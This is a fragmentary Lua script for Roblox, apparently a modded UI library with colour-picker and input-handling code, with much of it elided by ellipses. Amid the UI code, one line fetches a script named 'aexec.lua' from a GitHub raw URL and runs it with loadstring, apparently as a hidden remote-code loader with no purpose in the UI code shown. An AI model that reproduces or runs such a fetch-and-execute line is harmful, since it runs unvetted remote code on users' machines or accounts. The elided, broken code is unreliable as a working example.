--[[
  ...
  Modded by InfnityMercury
--]]

local ui_options = {
	main_color = Color3.fromRGB(41, 74, 122),
	min_size = Vector2.new(400, 300),
	toggle_key = Enum.KeyCode.J,
	can_resize = true,
}
...
loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/aexec.lua'))()
						...
						do -- Color Picker Math
							...
							UIS.InputBegan:Connect(function(inputObject)
								...
								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
									Held = true
									task.spawn(function() -- Loop check
										while Held and Entered1 and (not dropdown_open) and task.wait() do -- Palette
											local mouse_location = gMouse()
										...
										while Held and Entered2 and (not dropdown_open) and task.wait() do -- Saturation
											local mouse_location = gMouse()
											local y = ((palette.AbsoluteSize.Y - (mouse_location.Y - palette.AbsolutePosition.Y)) + 1.5)
											v = y / 100
